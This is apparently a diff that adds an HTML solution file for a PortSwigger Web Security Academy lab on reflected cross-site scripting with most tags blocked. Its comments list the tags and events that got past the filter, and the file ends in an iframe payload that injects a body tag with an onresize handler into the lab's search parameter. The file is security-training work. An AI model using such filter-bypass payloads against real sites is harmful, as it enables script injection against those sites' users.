@@ -1,0 +1,10 @@
+<!-- The payload below was meant to solve the following lab: -->
+<!-- https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked -->
+
+<!-- Using the python script named find-valid-tag.py in this directory the following tags and events were found to make it past the filter: -->
+<!-- TAGS: <body> -->
+<!-- EVENTS: ['onbeforeinput', 'onratechange', 'onresize', 'onscrollend'] -->
+
+<!-- The payload below uses the onresize event -->
+
+<iframe src="https://0a2f0067038fd18f837837ae00d10073.web-security-academy.net/?search=%3C%2Fh1><body onresize=print()>%3C%2Fbody>"></iframe>
